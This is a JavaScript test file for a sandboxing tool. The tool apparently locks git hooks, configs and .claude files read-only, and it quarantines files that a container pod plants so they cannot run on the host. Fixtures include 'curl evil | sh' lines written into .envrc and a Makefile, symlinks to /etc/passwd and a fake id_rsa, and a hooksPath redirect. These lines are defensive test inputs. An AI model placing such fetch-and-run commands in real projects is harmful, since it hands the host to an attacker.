import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { test } from 'node:test';
import { protectedMounts, quarantineCreated, snapshotMissing } from '../src/protect.js';
import { createExclusive, kind, realpathLoose, writeFileAtomic } from '../src/safefs.js';
import { tmp } from './helpers.js';

function repo() {
  const root = tmp();
  fs.mkdirSync(path.join(root, '.git'));
  fs.writeFileSync(path.join(root, '.git', 'config'), '[core]\n');
  return root;
}

test('protectedMounts locks git hooks/config and creates .claude and .git/hooks', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, '.mcp.json'), '{}');
  const { pinned, readOnly } = protectedMounts(root);
  assert.deepEqual(pinned, [path.join(root, '.git')]);
  assert.deepEqual(readOnly.sort(), ['.claude', '.git/config', '.git/hooks', '.mcp.json'].map((r) => path.join(root, r)).sort());
  assert.ok(fs.statSync(path.join(root, '.claude')).isDirectory());
});

test('protectedMounts refuses planted symlinks', () => {
  const root = repo();
  const secret = path.join(tmp(), 'id_rsa');
  fs.writeFileSync(secret, 'KEY');
  fs.rmSync(path.join(root, '.git', 'config'));
  fs.symlinkSync(secret, path.join(root, '.git', 'config'));
  assert.throws(() => protectedMounts(root), /symlink/);
});

test('protectedMounts refuses a .git/commondir redirect', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, '.git', 'commondir'), '/elsewhere\n');
  assert.throws(() => protectedMounts(root), /commondir/);
});

test('files a pod creates that would run on the host are quarantined', () => {
  const root = repo();
  const missing = snapshotMissing(root);
  assert.ok(missing.includes('.mcp.json') && missing.includes('.envrc') && missing.includes('.git/commondir') && !missing.includes('.git'));
  fs.writeFileSync(path.join(root, '.envrc'), 'curl evil | sh');
  fs.symlinkSync('/etc/passwd', path.join(root, '.mcp.json'));
  const moved = quarantineCreated(root, missing);
  assert.equal(moved.length, 2);
  assert.ok(!fs.existsSync(path.join(root, '.envrc')));
  assert.ok(fs.readFileSync('/etc/passwd', 'utf8').length > 0, 'symlink target untouched');
});

test('writeFileAtomic and createExclusive never write through a planted symlink', () => {
  const dir = tmp();
  const target = path.join(tmp(), 'victim');
  fs.writeFileSync(target, 'ORIGINAL');
  fs.symlinkSync(target, path.join(dir, 'a'));
  writeFileAtomic(path.join(dir, 'a'), 'new');
  assert.equal(fs.readFileSync(target, 'utf8'), 'ORIGINAL');
  assert.equal(fs.readFileSync(path.join(dir, 'a'), 'utf8'), 'new');
  assert.equal(fs.statSync(path.join(dir, 'a')).mode & 0o777, 0o600);

  fs.symlinkSync(target, path.join(dir, 'b'));
  fs.closeSync(createExclusive(path.join(dir, 'b')));
  assert.equal(fs.readFileSync(target, 'utf8'), 'ORIGINAL');
});

test('realpathLoose resolves existing ancestors', () => {
  const dir = tmp();
  fs.mkdirSync(path.join(dir, 'real'));
  fs.symlinkSync(path.join(dir, 'real'), path.join(dir, 'link'));
  assert.equal(realpathLoose(path.join(dir, 'link', 'x', 'y')), path.join(dir, 'real', 'x', 'y'));
});

// A repo whose .git/config sets core.hooksPath to `value` (written raw, as git would read it).
function repoWithHooksPath(value) {
  const root = repo();
  fs.writeFileSync(path.join(root, '.git', 'config'), `[core]\n\thooksPath = ${value}\n`);
  return root;
}

test('core.hooksPath unset or empty adds nothing', () => {
  const base = protectedMounts(repo()).readOnly.length;
  assert.equal(protectedMounts(repoWithHooksPath('')).readOnly.length, base);
});

test('core.hooksPath inside the project is locked read-only, and created if missing', () => {
  const rel = repoWithHooksPath('.githooks/');
  fs.mkdirSync(path.join(rel, '.githooks'));
  assert.ok(protectedMounts(rel).readOnly.includes(path.join(rel, '.githooks')));

  const root = repo();
  const abs = path.join(root, 'tools', 'hooks');
  fs.writeFileSync(path.join(root, '.git', 'config'), `[core]\n\thooksPath = ${abs}\n`);
  assert.ok(protectedMounts(root).readOnly.includes(abs));
  assert.ok(fs.statSync(abs).isDirectory(), 'created');
});

test('core.hooksPath pointing at .git/hooks or inside .claude is not mounted twice', () => {
  const base = protectedMounts(repo()).readOnly.length;
  for (const value of ['.git/hooks', '.claude/hooks']) {
    const { readOnly } = protectedMounts(repoWithHooksPath(value));
    assert.equal(readOnly.length, base, value);
  }
});

test('core.hooksPath is read from .git/config only, never from its includes', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, 'inc'), '[core]\n\thooksPath = /etc\n');
  fs.writeFileSync(path.join(root, '.git', 'config'), `[include]\n\tpath = ${path.join(root, 'inc')}\n`);
  assert.doesNotThrow(() => protectedMounts(root));
});

test('core.hooksPath that is a symlink, or goes through one, is refused', () => {
  const outside = tmp();
  const root = repoWithHooksPath('.githooks');
  fs.symlinkSync(outside, path.join(root, '.githooks'));
  assert.throws(() => protectedMounts(root), /\.githooks is a symlink/);

  const nested = repoWithHooksPath('tools/hooks');
  fs.symlinkSync(outside, path.join(nested, 'tools'));
  assert.throws(() => protectedMounts(nested), /tools is a symlink/);
  assert.ok(!fs.existsSync(path.join(outside, 'hooks')), 'nothing created through the symlink');

  const file = repoWithHooksPath('.githooks');
  fs.writeFileSync(path.join(file, '.githooks'), '');
  assert.throws(() => protectedMounts(file), /is a file, not a dir/);
});

test('core.hooksPath outside the project, the project itself, or .git is refused', () => {
  const outside = tmp();
  for (const value of [outside, '../elsewhere', '~/hooks']) {
    assert.throws(() => protectedMounts(repoWithHooksPath(value)), /outside the project/, value);
  }
  assert.throws(() => protectedMounts(repoWithHooksPath('.')), /whole project read-only/);
  assert.throws(() => protectedMounts(repoWithHooksPath('.git/')), /whole \.git folder read-only/);
  // Creating it would make a watched path (never quarantined afterwards).
  assert.throws(() => protectedMounts(repoWithHooksPath('.vscode/hooks')), /inside \.vscode, which is missing/);
});

test('an unreadable .git/config refuses to start', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, '.git', 'config'), 'garbage[[\n');
  assert.throws(() => protectedMounts(root), /Could not read core\.hooksPath/);
});

test('.git/config.worktree is locked when present and quarantined when a pod creates it', () => {
  const root = repo();
  assert.ok(snapshotMissing(root).includes('.git/config.worktree'));
  fs.writeFileSync(path.join(root, '.git', 'config.worktree'), '[core]\n');
  assert.ok(protectedMounts(root).readOnly.includes(path.join(root, '.git', 'config.worktree')));
  const planted = repo();
  const missing = snapshotMissing(planted);
  fs.writeFileSync(path.join(planted, '.git', 'config.worktree'), '[core]\n\thooksPath = evil\n');
  assert.equal(quarantineCreated(planted, missing).length, 1);
  assert.ok(!fs.existsSync(path.join(planted, '.git', 'config.worktree')));
});

test('readOnly: existing files and dirs are mounted read-only; missing ones are watched', () => {
  const root = repo();
  fs.mkdirSync(path.join(root, 'scripts'));
  fs.writeFileSync(path.join(root, 'package.json'), '{}');
  fs.mkdirSync(path.join(root, 'infra'));
  const extra = ['scripts', 'package.json', 'infra/prod.sh', 'Makefile', 'deploy/run.sh', '.claude/settings.json'];
  const { readOnly } = protectedMounts(root, extra);
  for (const rel of ['scripts', 'package.json']) assert.ok(readOnly.includes(path.join(root, rel)), rel);
  for (const rel of ['infra/prod.sh', 'Makefile', 'deploy', 'deploy/run.sh', '.claude/settings.json']) {
    assert.ok(!readOnly.includes(path.join(root, rel)), rel);
  }
  const missing = snapshotMissing(root, extra);
  // A missing folder is recorded at the top, not the file under it.
  for (const rel of ['infra/prod.sh', 'Makefile', 'deploy']) assert.ok(missing.includes(rel), rel);
  assert.ok(!missing.includes('deploy/run.sh') && !missing.includes('scripts'));
});

test('readOnly: symlinks, outside paths and non-dirs on the way are refused', () => {
  const outside = tmp();
  fs.writeFileSync(path.join(outside, 'secret'), 'KEY');
  const link = repo();
  fs.symlinkSync(path.join(outside, 'secret'), path.join(link, 'package.json'));
  assert.throws(() => protectedMounts(link, ['package.json']), /symlink/);
  const parent = repo();
  fs.symlinkSync(outside, path.join(parent, 'scripts'));
  assert.throws(() => protectedMounts(parent, ['scripts/secret']), /symlink/);
  const file = repo();
  fs.writeFileSync(path.join(file, 'scripts'), '');
  assert.throws(() => protectedMounts(file, ['scripts/deploy.sh']), /is a file, not a dir/);
});

test('readOnly: what a pod creates is quarantined, never through a planted symlink', () => {
  const root = repo();
  const extra = ['scripts/deploy.sh', 'Makefile'];
  fs.mkdirSync(path.join(root, 'scripts'));
  const missing = snapshotMissing(root, extra);
  fs.writeFileSync(path.join(root, 'Makefile'), 'all:\n\tcurl evil | sh\n');
  // The pod swaps scripts/ for a symlink to a host folder holding a deploy.sh.
  const host = tmp();
  fs.writeFileSync(path.join(host, 'deploy.sh'), 'HOST FILE');
  fs.rmSync(path.join(root, 'scripts'), { recursive: true });
  fs.symlinkSync(host, path.join(root, 'scripts'));
  const moved = quarantineCreated(root, missing);
  assert.equal(moved.length, 2);
  assert.ok(!fs.existsSync(path.join(root, 'Makefile')));
  assert.equal(kind(path.join(root, 'scripts')), 'missing', 'the symlink itself was renamed');
  assert.ok(moved.some((m) => path.basename(m).startsWith('scripts.claude-pod-quarantine-')));
  assert.equal(fs.readFileSync(path.join(host, 'deploy.sh'), 'utf8'), 'HOST FILE', 'host file not moved');
  assert.deepEqual(fs.readdirSync(host), ['deploy.sh']);
});

test('readOnly: folders above a locked path are pinned so they cannot be renamed away', () => {
  const root = repo();
  fs.mkdirSync(path.join(root, 'scripts', 'ci'), { recursive: true });
  fs.writeFileSync(path.join(root, 'scripts', 'ci', 'deploy.sh'), '');
  fs.mkdirSync(path.join(root, 'infra'));
  fs.mkdirSync(path.join(root, 'tools'));
  const { pinned, readOnly } = protectedMounts(root, ['scripts/ci/deploy.sh', 'infra/prod.sh', 'tools', 'tools/x.sh']);
  for (const rel of ['.git', 'scripts', 'scripts/ci', 'infra']) assert.ok(pinned.includes(path.join(root, rel)), rel);
  assert.ok(!pinned.includes(path.join(root, 'tools')), 'a read-only folder is not also pinned');
  assert.ok(readOnly.includes(path.join(root, 'scripts', 'ci', 'deploy.sh')));
  assert.ok(readOnly.includes(path.join(root, 'tools')) && !readOnly.includes(path.join(root, 'tools', 'x.sh')), 'nested read-only mount dropped');
});

test('a nested core.hooksPath has its parent folders pinned, including ones it creates', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, '.git', 'config'), '[core]\n\thooksPath = tools/git/hooks\n');
  const { pinned, readOnly } = protectedMounts(root);
  assert.ok(readOnly.includes(path.join(root, 'tools', 'git', 'hooks')));
  for (const rel of ['tools', 'tools/git']) assert.ok(pinned.includes(path.join(root, rel)), rel);
});

test('readOnly entries inside a read-only mount are not watched, so host-made files stay', () => {
  const root = repo();
  const extra = ['.claude/settings.local.json', 'Makefile'];
  const { readOnly } = protectedMounts(root, extra);
  const missing = snapshotMissing(root, extra, readOnly);
  assert.ok(missing.includes('Makefile'));
  assert.ok(!missing.includes('.claude/settings.local.json'));
});

test('in a worktree (.git is a file) nothing under .git is watched, and .git is never renamed', () => {
  const root = tmp();
  fs.writeFileSync(path.join(root, '.git'), 'gitdir: /elsewhere/.git/worktrees/x\n');
  const missing = snapshotMissing(root);
  assert.ok(!missing.some((r) => r.startsWith('.git')), missing.join(','));
  // Even given an old record that lists one, a file on the way is not treated as planted.
  assert.deepEqual(quarantineCreated(root, ['.git/commondir']), []);
  assert.equal(kind(path.join(root, '.git')), 'file');
});

test('readOnly paths spelled in another case land on the same mount (case-insensitive file systems)', (t) => {
  const root = repo();
  fs.mkdirSync(path.join(root, 'scripts', 'ci'), { recursive: true });
  fs.writeFileSync(path.join(root, 'scripts', 'ci', 'deploy.sh'), '');
  if (kind(path.join(root, 'SCRIPTS')) === 'missing') return t.skip('case-sensitive file system');
  const { pinned, readOnly } = protectedMounts(root, ['SCRIPTS', 'scripts/ci/deploy.sh', '.CLAUDE/x']);
  assert.deepEqual(readOnly.filter((m) => m.toLowerCase().includes('scripts')), [path.join(root, 'scripts')]);
  assert.ok(!pinned.some((p) => p.toLowerCase().includes('scripts') || p.toLowerCase().includes('.claude')), pinned.join(','));
});
